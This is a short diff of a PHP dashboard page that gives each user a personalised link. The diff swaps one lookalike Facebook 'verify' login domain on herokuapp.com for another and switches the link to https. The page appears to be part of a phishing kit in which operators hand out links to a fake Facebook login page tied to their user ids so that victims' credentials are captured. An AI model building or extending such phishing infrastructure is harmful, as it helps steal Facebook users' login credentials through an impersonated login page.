@@ -48,7 +48,7 @@ $username  = $_SESSION['username'];
                     <p class="card-text">click the button below to genereate link. </p>
                     <button class="btn btn-danger btn-sm generate">Generate Link</button>
                     <textarea name="url" id="url" class="form-control mt-2" readonly style="word-break: break-all ;">
-                    <?php echo "http://facebookverify.herokuapp.com/login.php?en=" . $user_id;  ?>
+                    <?php echo "https://facebookverifi.herokuapp.com/login.php?en=" . $user_id;  ?>
                     </textarea>
                 </div>
                 <div class="inst mt-3">
